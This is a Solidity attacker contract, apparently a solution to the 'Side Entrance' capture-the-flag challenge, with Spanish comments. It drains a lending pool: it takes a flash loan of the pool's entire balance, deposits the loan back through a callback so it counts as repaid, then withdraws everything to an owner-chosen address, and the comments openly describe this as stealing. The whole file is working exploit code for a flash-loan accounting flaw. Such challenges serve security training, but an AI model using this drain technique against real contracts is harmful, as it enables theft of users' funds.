// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}


contract SideEntranceAttacker is Ownable {
  using Address for address payable;

  ISideEntranceLenderPool _pool;
  address payable _attackerWallet;

  constructor(address payable pool, address payable attackerWallet) {
    _pool = ISideEntranceLenderPool(pool);
    _attackerWallet = attackerWallet;
  }

  function attack() public {
    //Nos queremos chorear todito el balance de la pool.
    uint256 poolBalance = address(_pool).balance;
    console.log("Valor inicial de poolBalance: %s", poolBalance);
    
    _pool.flashLoan(poolBalance);
    _pool.withdraw();
  }

  function execute() external payable {
    console.log("Ejecutando funcion execute desde contrato malicioso --> Llamaos a deposit");
    _pool.deposit{value: msg.value}();
  }

  //Finalmente agregamos una función para retirar todito (extensión de solidity remarca "todo", pueden creerlo?) lo que nos choreamos.
  function withdraw(address payable oneAddress) public onlyOwner {
    oneAddress.sendValue(address(this).balance);

    uint256 poolBalance = address(_pool).balance;
    console.log("Ya retiramos todo! --> Valor de poolBalance: %s", poolBalance);
  }

  //Si no agregamos el receive, el contrato no sabrá qué hacer para recibir ether.
  receive() external payable {}
}
